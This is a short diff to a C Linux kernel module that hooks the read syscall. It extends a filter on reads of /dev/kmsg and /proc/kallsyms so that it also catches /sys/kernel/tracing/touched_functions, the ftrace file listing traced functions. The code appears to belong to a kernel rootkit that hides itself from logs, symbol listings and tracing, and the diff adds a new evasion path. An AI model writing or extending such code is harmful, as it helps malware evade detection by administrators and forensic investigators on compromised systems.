@@ -27,8 +27,10 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     // Check if the fd is from /dev/kmsg or /proc/kallsyms
     file = fget(fd); // Gets the file object corresponding to the fd
     if (file) {
-        // Check if the file is /dev/kmsg or /proc/kallsyms
-        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 || strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0) {
+        // Check if the file is /dev/kmsg or /proc/kallsyms or /sys/kernel/tracing/touched_functions
+        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
+            strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
+            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0) {
             fput(file); // Frees the file object after verification
 
             // Allocates a temporary buffer in kernel space
